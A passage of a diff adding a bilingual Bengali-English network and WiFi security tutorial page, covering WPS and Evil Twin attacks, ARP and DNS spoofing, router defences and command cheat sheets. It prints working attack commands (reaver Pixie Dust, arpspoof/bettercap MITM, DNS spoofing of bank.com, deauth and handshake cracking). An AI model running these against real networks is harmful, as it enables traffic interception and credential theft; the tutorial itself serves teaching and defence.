+        <li>🟡 <span class="bn-text">Dictionary word + numbers (admin123) → ঘণ্টার মধ্যে</span><span class="en-text">Dictionary word + numbers (admin123) → within hours</span></li>
+        <li>🟢 <span class="bn-text">Random 12+ chars (K#9mP@2Lq!v) → বছর বা অসম্ভব</span><span class="en-text">Random 12+ chars (K#9mP@2Lq!v) → years or impossible</span></li>
+        <li>💡 <span class="bn-text">WPA3 ব্যবহার করো — offline crack প্রতিরোধ করে</span><span class="en-text">Use WPA3 — it prevents offline cracking</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH 9: WPS & OTHER VULNS -->
+<div class="chapter ch9">
+  <div class="chapter-header" data-num="09">
+    <div class="ch-label">CHAPTER 09</div>
+    <div class="ch-title">📌 <span class="bn-text">WPS ও অন্যান্য WiFi Vulnerabilities</span><span class="en-text">WPS & Other WiFi Vulnerabilities</span></div>
+    <div class="ch-desc"><span class="bn-text">WPS PIN attack, Pixie Dust, Evil Twin — WiFi-র অন্যান্য দুর্বলতার পরিচিতি</span><span class="en-text">WPS PIN attack, Pixie Dust, Evil Twin — introduction to other WiFi vulnerabilities</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">WPS — WiFi Protected Setup দুর্বলতা</span><span class="en-text">WPS — WiFi Protected Setup Vulnerability</span></h2>
+    <p><span class="bn-text">WPS হলো router-এ easy connection-এর জন্য একটি feature। কিন্তু এর 8-digit PIN system-এ fundamental design flaw আছে — শুধু 11,000 combination try করেই crack করা যায়।</span><span class="en-text">WPS is a feature for easy router connections. But its 8-digit PIN system has a fundamental design flaw — it can be cracked by trying only 11,000 combinations.</span></p>
+    <div class="code">
+<span class="c"># WPS enabled networks খোঁজা</span>
+<span class="p">$</span> wash -i wlan0mon                     <span class="c"># WPS-enabled APs scan</span>
+<span class="p">$</span> airodump-ng wlan0mon --wps           <span class="c"># WPS info দেখো</span>
+
+<span class="c"># Reaver — WPS PIN brute force (নিজের router-এ test)</span>
+<span class="p">$</span> reaver -i wlan0mon -b TARGET_BSSID -vv
+<span class="p">$</span> reaver -i wlan0mon -b TARGET_BSSID -vv -N   <span class="c"># No association</span>
+
+<span class="c"># Pixie Dust Attack — দ্রুততর (seconds-এ)</span>
+<span class="p">$</span> reaver -i wlan0mon -b TARGET_BSSID -vv -K 1
+<span class="p">$</span> bully wlan0mon -b TARGET_BSSID -d -v 3
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Evil Twin Attack — কীভাবে কাজ করে (Theory)</span><span class="en-text">Evil Twin Attack — How It Works (Theory)</span></h2>
+    <div class="netdiag">
+<span class="nd-r">Evil Twin Attack Flow:</span>
+
+1. <span class="nd-y">Attacker</span> target AP-এর same SSID দিয়ে fake AP তৈরি করে
+2. <span class="nd-y">Attacker</span> real AP-তে deauth attack পাঠায়
+3. <span class="nd-g">Victim</span> disconnect হয়ে fake AP-তে connect করে
+4. Fake AP <span class="nd-r">captive portal</span> দেখায় "WiFi password re-enter করুন"
+5. <span class="nd-g">Victim</span> password দেয় → <span class="nd-r">Attacker</span> পেয়ে যায়
+
+<span class="nd-b">Tools: airbase-ng, hostapd-wpe, wifiphisher</span>
+<span class="nd-y">Note: এটা Social Engineering — technical bypass নয়</span>
+    </div>
+
+    <div class="box warn">
+      <div class="box-t">🔍 <span class="bn-text">Evil Twin থেকে রক্ষা পাওয়ার উপায়</span><span class="en-text">How to Protect Against Evil Twin</span></div>
+      <ul>
+        <li><span class="bn-text">VPN ব্যবহার করো — public WiFi-তে সবসময়</span><span class="en-text">Use a VPN — always on public WiFi</span></li>
+        <li><span class="bn-text">HTTPS-only sites ব্যবহার করো</span><span class="en-text">Use HTTPS-only sites</span></li>
+        <li><span class="bn-text">অচেনা network-এ password দিও না</span><span class="en-text">Never enter passwords on unknown networks</span></li>
+        <li><span class="bn-text">WPA3 Enterprise ব্যবহার করো (certificate validation)</span><span class="en-text">Use WPA3 Enterprise (certificate validation)</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH 10: NETWORK ATTACKS -->
+<div class="chapter ch10">
+  <div class="chapter-header" data-num="10">
+    <div class="ch-label">CHAPTER 10</div>
+    <div class="ch-title">⚡ <span class="bn-text">Network Attack Techniques</span><span class="en-text">Network Attack Techniques</span></div>
+    <div class="ch-desc"><span class="bn-text">ARP Spoofing, DNS Spoofing, MITM — কীভাবে কাজ করে এবং কীভাবে রক্ষা পাওয়া যায়</span><span class="en-text">ARP Spoofing, DNS Spoofing, MITM — how they work and how to protect yourself</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">ARP Spoofing — MITM-এর মূল</span><span class="en-text">ARP Spoofing — The Foundation of MITM</span></h2>
+    <div class="netdiag">
+<span class="nd-y">Normal ARP:</span>
+  PC (192.168.1.5) → "Router-এর MAC কে?" → Router জানায়
+
+<span class="nd-r">ARP Spoofing:</span>
+  Attacker → PC: "আমিই Router (192.168.1.1)! আমার MAC: AA:BB:CC"
+  Attacker → Router: "আমিই PC (192.168.1.5)! আমার MAC: AA:BB:CC"
+
+  PC → (sends to Attacker thinking it's Router) → Router
+  All traffic passes through Attacker!
+
+<span class="nd-b">Tools: arpspoof, bettercap, ettercap</span>
+    </div>
+    <div class="code">
+<span class="c"># ARP Spoofing (নিজের lab-এ test)</span>
+<span class="p">$</span> echo 1 > /proc/sys/net/ipv4/ip_forward   <span class="c"># Forwarding চালু</span>
+<span class="p">$</span> arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
+<span class="p">$</span> arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
+
+<span class="c"># Bettercap — Modern MITM framework</span>
+<span class="p">$</span> bettercap -iface eth0
+<span class="p">»</span> net.probe on
+<span class="p">»</span> arp.spoof.targets VICTIM_IP
+<span class="p">»</span> arp.spoof on
+<span class="p">»</span> net.sniff on
+
+<span class="c"># ARP Spoofing detect করা</span>
+<span class="p">$</span> arp -n                    <span class="c"># Duplicate MAC address দেখো</span>
+<span class="p">$</span> arpwatch                  <span class="c"># ARP change monitor</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">DNS Spoofing</span><span class="en-text">DNS Spoofing</span></h2>
+    <div class="code">
+<span class="c"># dnsspoof (MITM-এর পরে)</span>
+<span class="c"># /etc/hosts file-এ fake entries যোগ করো</span>
+<span class="p">$</span> echo "192.168.1.100 bank.com" >> /tmp/fakehosts
+<span class="p">$</span> dnsspoof -f /tmp/fakehosts
+
+<span class="c"># Bettercap DNS spoofing</span>
+<span class="p">»</span> set dns.spoof.domains bank.com,facebook.com
+<span class="p">»</span> set dns.spoof.address 192.168.1.100
+<span class="p">»</span> dns.spoof on
+    </div>
+  </div>
+</div>
+
+<!-- CH 11: DEFENSE -->
+<div class="chapter ch11">
+  <div class="chapter-header" data-num="11">
+    <div class="ch-label">CHAPTER 11</div>
+    <div class="ch-title">🛡️ <span class="bn-text">Network ও WiFi Defense</span><span class="en-text">Network & WiFi Defense</span></div>
+    <div class="ch-desc"><span class="bn-text">নিজের network সুরক্ষিত করার সম্পূর্ণ গাইড — এখনই করো</span><span class="en-text">Complete guide to securing your own network — do it now</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">WiFi Router Security Checklist</span><span class="en-text">WiFi Router Security Checklist</span></h2>
+    <div class="grid2">
+      <div class="card r-card">
+        <h4>❌ <span class="bn-text">এখনই ঠিক করো</span><span class="en-text">Fix These Now</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">Default router password পরিবর্তন করো (admin/admin)</span><span class="en-text">Change default router password (admin/admin)</span></li>
+          <li><span class="bn-text">WEP বা WPA ব্যবহার করলে WPA2/WPA3-এ upgrade করো</span><span class="en-text">Upgrade from WEP or WPA to WPA2/WPA3</span></li>
+          <li><span class="bn-text">WPS সম্পূর্ণ বন্ধ করো</span><span class="en-text">Completely disable WPS</span></li>
+          <li><span class="bn-text">Remote management বন্ধ করো</span><span class="en-text">Disable remote management</span></li>
+          <li><span class="bn-text">Firmware আপডেট করো</span><span class="en-text">Update firmware</span></li>
+        </ul>
+      </div>
+      <div class="card g-card">
+        <h4>✅ <span class="bn-text">ভালো প্র্যাকটিস</span><span class="en-text">Good Practices</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">WPA3 ব্যবহার করো (সম্ভব হলে)</span><span class="en-text">Use WPA3 (if possible)</span></li>
+          <li><span class="bn-text">20+ character random WiFi password</span><span class="en-text">20+ character random WiFi password</span></li>
+          <li><span class="bn-text">Guest network আলাদা রাখো</span><span class="en-text">Keep guest network separate</span></li>
+          <li><span class="bn-text">SSID change করো (ISP default নয়)</span><span class="en-text">Change your SSID (not ISP default)</span></li>
+          <li><span class="bn-text">Connected devices regularly check করো</span><span class="en-text">Regularly check connected devices</span></li>
+          <li><span class="bn-text">VPN ব্যবহার করো public WiFi-তে</span><span class="en-text">Use a VPN on public WiFi</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Network-Level Defense</span><span class="en-text">Network-Level Defense</span></h2>
+    <div class="code">
+<span class="c"># Firewall (UFW) setup — Linux server</span>
+<span class="p">$</span> ufw enable
+<span class="p">$</span> ufw default deny incoming
+<span class="p">$</span> ufw default allow outgoing
+<span class="p">$</span> ufw allow 22/tcp    <span class="c"># SSH শুধু</span>
+<span class="p">$</span> ufw allow 80/tcp    <span class="c"># HTTP</span>
+<span class="p">$</span> ufw allow 443/tcp   <span class="c"># HTTPS</span>
+<span class="p">$</span> ufw deny 23/tcp     <span class="c"># Telnet block</span>
+<span class="p">$</span> ufw status verbose
+
+<span class="c"># ARP Spoofing protection</span>
+<span class="p">$</span> arp -s GATEWAY_IP GATEWAY_MAC    <span class="c"># Static ARP entry</span>
+<span class="c"># Router-এ Dynamic ARP Inspection (DAI) চালু করো</span>
+
+<span class="c"># Nmap দিয়ে নিজের network scan করো</span>
+<span class="p">$</span> nmap -sV -A 192.168.1.0/24 -oA home_network_audit
+<span class="c"># যে ports unexpected open আছে সেগুলো close করো</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">WiFi Password Strength Test</span><span class="en-text">WiFi Password Strength Test</span></h2>
+    <div class="code">
+<span class="c"># নিজের WiFi password কতটা strong সেটা test করো</span>
+<span class="c"># Step 1: নিজের WiFi-এর handshake capture করো (ch8)</span>
+<span class="c"># Step 2: rockyou.txt দিয়ে crack try করো</span>
+<span class="p">$</span> aircrack-ng -w /usr/share/wordlists/rockyou.txt -b YOUR_BSSID handshake.cap
+
+<span class="c"># যদি crack হয় → password পরিবর্তন করো!</span>
+<span class="c"># Strong password উদাহরণ:</span>
+<span class="c"># Tr0ub4dor&3 (xkcd-style passphrase) ← এটাও মাঝারি</span>
+<span class="c"># K#9mP@2Lq!vN7rTw (random 16-char) ← এটাই ভালো</span>
+<span class="c"># Use password manager to generate!</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH 12: CHEAT SHEET -->
+<div class="chapter ch12">
+  <div class="chapter-header" data-num="12">
+    <div class="ch-label">CHAPTER 12</div>
+    <div class="ch-title">📋 <span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div>
+    <div class="ch-desc"><span class="bn-text">Nmap, tcpdump, aircrack-ng, Wireshark filters — সব কমান্ড এক জায়গায়</span><span class="en-text">Nmap, tcpdump, aircrack-ng, Wireshark filters — all commands in one place</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🗺️ Nmap Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#2563eb; color:#fff;">Scan Types</div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sS IP</span><span class="cheat-desc">SYN Stealth (default)</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sT IP</span><span class="cheat-desc">TCP Connect</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sU IP</span><span class="cheat-desc">UDP scan</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sV IP</span><span class="cheat-desc"><span class="bn-text">Version detect</span><span class="en-text">Version detect</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -A IP</span><span class="cheat-desc"><span class="bn-text">Aggressive (all)</span><span class="en-text">Aggressive (all)</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sn 192.168.1.0/24</span><span class="cheat-desc"><span class="bn-text">Ping scan only</span><span class="en-text">Ping scan only</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#059669; color:#fff;">Ports & Output</div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -p- IP</span><span class="cheat-desc">All 65535 ports</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -p 80,443 IP</span><span class="cheat-desc"><span class="bn-text">Specific ports</span><span class="en-text">Specific ports</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap --top-ports 100 IP</span><span class="cheat-desc">Top 100</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -oA output IP</span><span class="cheat-desc"><span class="bn-text">All formats save</span><span class="en-text">Save all formats</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -T4 IP</span><span class="cheat-desc">Fast timing</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap --script vuln IP</span><span class="cheat-desc">Vuln scan</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">📦 tcpdump Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#dc2626; color:#fff;">Capture</div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump -i eth0</span><span class="cheat-desc"><span class="bn-text">Interface capture</span><span class="en-text">Capture on interface</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump -i eth0 -w file.pcap</span><span class="cheat-desc"><span class="bn-text">File-এ save</span><span class="en-text">Save to file</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump -r file.pcap</span><span class="cheat-desc"><span class="bn-text">File পড়া</span><span class="en-text">Read file</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump -i eth0 -n</span><span class="cheat-desc">No DNS lookup</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump -i eth0 -A port 80</span><span class="cheat-desc">HTTP content</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#7c3aed; color:#fff;">Filters</div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump host IP</span><span class="cheat-desc"><span class="bn-text">Specific IP</span><span class="en-text">Specific IP</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump port 443</span><span class="cheat-desc"><span class="bn-text">Specific port</span><span class="en-text">Specific port</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump tcp</span><span class="cheat-desc">TCP only</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump udp</span><span class="cheat-desc">UDP only</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcpdump icmp</span><span class="cheat-desc">ICMP/Ping only</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">📡 Aircrack-ng Suite Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#d97706; color:#fff;">Monitor & Scan</div>
+        <div class="cheat-row"><span class="cheat-cmd">airmon-ng check kill</span><span class="cheat-desc"><span class="bn-text">Process বন্ধ</span><span class="en-text">Kill processes</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">airmon-ng start wlan0</span><span class="cheat-desc">Monitor mode</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">airmon-ng stop wlan0mon</span><span class="cheat-desc"><span class="bn-text">Monitor বন্ধ</span><span class="en-text">Stop monitor</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">airodump-ng wlan0mon</span><span class="cheat-desc"><span class="bn-text">Network scan</span><span class="en-text">Network scan</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">wash -i wlan0mon</span><span class="cheat-desc">WPS scan</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#2563eb; color:#fff;">Capture & Crack</div>
+        <div class="cheat-row"><span class="cheat-cmd">airodump-ng --bssid MAC -c CH -w cap wlan0mon</span><span class="cheat-desc">Handshake capture</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">aireplay-ng --deauth 10 -a BSSID wlan0mon</span><span class="cheat-desc">Deauth attack</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">aircrack-ng cap.cap -w wordlist.txt</span><span class="cheat-desc">Dictionary crack</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashcat -m 22000 hash.hc22000 wordlist.txt</span><span class="cheat-desc">GPU crack</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hcxtools cap.cap -o hash.hc22000</span><span class="cheat-desc">Convert format</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🦈 Wireshark Filter Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#059669; color:#fff;"><span class="bn-text">Protocol Filters</span><span class="en-text">Protocol Filters</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">http</span><span class="cheat-desc">HTTP traffic</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">dns</span><span class="cheat-desc">DNS queries</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcp.port == 22</span><span class="cheat-desc">SSH</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">tcp.flags.syn == 1</span><span class="cheat-desc">SYN packets</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">arp</span><span class="cheat-desc">ARP packets</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">icmp</span><span class="cheat-desc">Ping/ICMP</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#7c3aed; color:#fff;"><span class="bn-text">Content Filters</span><span class="en-text">Content Filters</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">http.request.method == "POST"</span><span class="cheat-desc">POST requests</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">http contains "password"</span><span class="cheat-desc"><span class="bn-text">Password খোঁজা</span><span class="en-text">Find password</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">ip.addr == 192.168.1.1</span><span class="cheat-desc"><span class="bn-text">IP filter</span><span class="en-text">IP filter</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">dns.qry.name contains "google"</span><span class="cheat-desc">DNS query</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">wlan.fc.type_subtype == 0x08</span><span class="cheat-desc">WiFi beacon</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">eapol</span><span class="cheat-desc">WPA handshake</span></div>
+      </div>
+    </div>
+
+    <div style="text-align:center; margin-top:50px; padding:30px; background:var(--code-bg); border-radius:8px; border-top:4px solid #2563eb;">
+      <div style="font-family:'Space Mono',monospace; font-size:14px; color:#e2e8f0; margin-bottom:10px;">
+        <span style="color:#60a5fa;">$</span> nmap -sV --script vuln <span style="color:#34d399;">192.168.1.0/24</span>
+      </div>
+      <div style="font-family:'Space Mono',monospace; font-size:12px; color:#34d399;">
+        [+] <span class="bn-text">Network scanning শেখা হলো</span><span class="en-text">Network scanning learned</span> ✓<br>
+        [+] <span class="bn-text">WiFi security বোঝা হলো</span><span class="en-text">WiFi security understood</span> ✓<br>
+        [+] <span class="bn-text">নিজের network রক্ষা করো</span><span class="en-text">Protect your own network</span> ✓
+      </div>
+      <p style="color:rgba(140,170,200,0.4); font-size:12px; margin-top:14px; max-width:580px; margin-left:auto; margin-right:auto;">
+        <span class="bn-text">সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে। শুধুমাত্র authorized environment-এ এবং নিজের নেটওয়ার্কে practice করো।</span>
+        <span class="en-text">Entirely educational. Practice only in authorized environments and on your own network.</span>
+      </p>
+      <p style="margin-top:10px; font-size:10px; color:rgba(37,99,235,0.3); font-family:'Space Mono',monospace;">
+        v1.0 — Network Scanning &amp; WiFi Security | Bilingual | 12 Chapters + Cheat Sheet
+      </p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const body = document.body;
+body.classList.add('light-mode');
+
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode', 'dark-mode');
+    btn.textContent = '☀️ Light';
+    localStorage.setItem('theme', 'dark');
+  } else {
+    body.classList.replace('dark-mode', 'light-mode');
+    btn.textContent = '🌙 Dark';
+    localStorage.setItem('theme', 'light');
+  }
+}
+
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English';
+    localStorage.setItem('lang', 'bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা';
+    localStorage.setItem('lang', 'en');
+  }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  const t = localStorage.getItem('theme');
+  const l = localStorage.getItem('lang');
+  if (t === 'dark') {
+    body.classList.replace('light-mode', 'dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) btn.textContent = '☀️ Light';
+  }
+  if (l === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) btn.textContent = '🇧🇩 বাংলা';
+  }
+});
+</script>
+</body>
+</html>
